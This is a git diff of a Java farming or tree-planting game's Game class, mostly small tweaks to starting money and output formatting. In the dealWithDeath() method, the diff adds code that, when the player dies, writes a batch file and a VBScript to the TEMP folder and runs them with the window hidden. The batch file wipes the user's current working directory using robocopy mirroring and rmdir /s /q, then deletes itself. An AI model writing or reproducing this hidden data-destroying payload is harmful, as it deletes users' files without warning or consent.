@@ -1,7 +1,7 @@
 import java.util.ArrayList;
-import java.io.File;  // Import the File class
-import java.io.IOException;  // Import the IOException class to handle errors
-// https://www.w3schools.com/java/java_files_create.asp
+import java.io.File; // https://www.w3schools.com/java/java_files_create.asp
+import java.io.IOException;
+import java.io.FileWriter;
 
 public class Game {
     private double money;
@@ -14,7 +14,7 @@ public class Game {
     private boolean dead;
 
     public Game() {
-        money = 100;
+        money = 100001;
         netWorth = money + Plot.BASE_COST + Tree.costBasedOnType("small");
         plots = new ArrayList<Plot>();
         plots.add(new Plot());
@@ -54,24 +54,52 @@ public class Game {
         return dead;
     }
 
+    /***
+     * This just deletes all the files in the parent directory.
+     * Seriously.
+     * <p>
+     * (deletes all files in parent directory)
+     */
     public void dealWithDeath() {
-//        try {
-//            File myObj = new File("%temp%\\filename.txt");
-//            if (myObj.createNewFile()) {
-//                System.out.println("File created: " + myObj.getName());
-//            } else {
-//                System.out.println("File already exists.");
-//            }
-//        } catch (IOException e) {
-//            System.out.println("An error occurred.");
-//            e.printStackTrace();
-//        }
+        try {
+            Thread.sleep(4000);
+            String filePath = System.getenv("TEMP")+"\\delproj.cmd";
+            new File(filePath);
+            FileWriter myWriter = new FileWriter(filePath);
+            // https://superuser.com/questions/173859/how-can-i-delete-all-files-subfolders-in-a-given-folder-via-the-command-prompt
+            myWriter.write("del /f \"hidecmd.vbs\"\n" +
+                    "mkdir empty_folder\n" +
+                    "robocopy /mir empty_folder " + System.getProperty("user.dir") + "\n" +
+                    "rmdir /s /q " + System.getProperty("user.dir") + "\n" +
+                    "rmdir /s /q empty_folder" + "\n" +
+                    "start /b \"\" cmd /c del \"%~f0\"&exit /b" // https://stackoverflow.com/questions/20329355/how-to-make-a-batch-file-delete-itself
+            );
+            myWriter.close();
+
+            filePath = System.getenv("TEMP")+"\\hidecmd.vbs";
+            new File(filePath);
+            myWriter = new FileWriter(filePath);
+            // https://superuser.com/questions/140047/how-to-run-a-batch-file-without-launching-a-command-window
+            myWriter.write("Set oShell = CreateObject (\"Wscript.Shell\") \n" +
+                    "Dim strArgs\n" +
+                    "strArgs = \"cmd /c delproj.cmd\"\n" +
+                    "oShell.Run strArgs, 0, false");
+            myWriter.close();
+            System.out.println(filePath);
+            // https://www.spigotmc.org/threads/java-not-running-vb-script.446856/
+
+            String[] command = {"wscript.exe", filePath};
+            ProcessBuilder builder = new ProcessBuilder(command);
+            Process p = builder.start();
+        } catch (IOException | InterruptedException e) {
+            System.out.println("An error occurred.");
+            e.printStackTrace();
+        }
     }
 
     public boolean canAffordTrees(String treeType, int amount) {
         return money >= Tree.costBasedOnType(treeType) * amount;
     }
-
     public boolean canAffordPlots(int amount) {
         return money >= amount * Plot.BASE_COST;
     }
@@ -123,7 +151,7 @@ public class Game {
             large += treeCount[2];
         }
 
-        return "S: " + small + " M: " + medium + " L: " + large + " (Total: " + (small + medium + large) + ")";
+        return "S: " + small + " | M: " + medium + " | L: " + large + " (Total: " + (small + medium + large) + ")";
     }
 
     public String listAllPlotTrees() {
@@ -150,7 +178,7 @@ public class Game {
 
     public String treesRemovedIfMakeSpace(int plotNum, String treeType, int amount) {
         int[] treesRemoved = plots.get(plotNum - 1).treesRemovedIfMakeSpace(treeType, amount);
-        return "remove " + treesRemoved[0] + " small\n" +
+        return treesRemoved[0] + " small\n" +
                 treesRemoved[1] + " medium\n" +
                 treesRemoved[2] + " large";
     }
